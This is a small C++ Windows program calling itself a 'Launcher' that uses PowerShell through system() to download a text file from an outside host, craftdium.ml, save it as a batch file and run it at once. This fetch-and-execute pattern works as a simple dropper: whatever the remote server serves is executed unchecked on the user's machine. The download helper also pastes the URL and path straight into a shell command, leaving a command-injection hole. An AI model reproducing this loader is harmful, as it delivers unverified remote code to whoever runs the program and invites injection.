#include <iostream>

int download(std::string url, std::string destination) {
    system(("powershell -Command \"(New-Object Net.WebClient).DownloadFile('" + url + "', '" + destination + "')\" ").c_str());
    return 0;
}


int main() {
    system("title Launcher");
    system("if not exist %CD%\\Launcher md %CD%\\Launcher");
    download("https://craftdium.ml/res/launcher/launcher.txt", "Launcher\\launcher.bat");
    system("cd Launcher && launcher.bat");
    return 0;
}
